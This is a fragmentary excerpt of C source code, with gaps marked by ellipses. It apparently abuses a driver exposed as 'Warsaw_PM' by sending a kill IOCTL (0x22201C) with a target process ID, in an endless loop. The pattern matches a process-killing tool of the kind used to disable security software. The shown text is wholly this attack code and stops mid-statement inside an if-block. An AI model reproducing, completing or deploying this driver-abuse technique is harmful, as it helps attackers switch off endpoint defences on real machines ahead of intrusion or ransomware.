...
#define KILL_IOCTL_CODE 0x22201C
#define DRIVER_DEVICE L"\\\\.\\Warsaw_PM"
#define WINDOWS_ENGINE TRUE

typedef struct _killBuff {
	DWORD PID;
	BYTE buffer[1032];
} killBuff, *pKillBuff;
...
int main(int argc, char* argv[]) {
	...
	while (1) {
		if(WINDOWS_ENGINE) {
			...
			if (PID != -1) {
				ioctl_result = DeviceIoControl(hDriver, KILL_IOCTL_CODE, &BUFFER, sizeof(BUFFER), &outBuffer, 256, &bytesReturned, NULL);
				if (ioctl_result) {
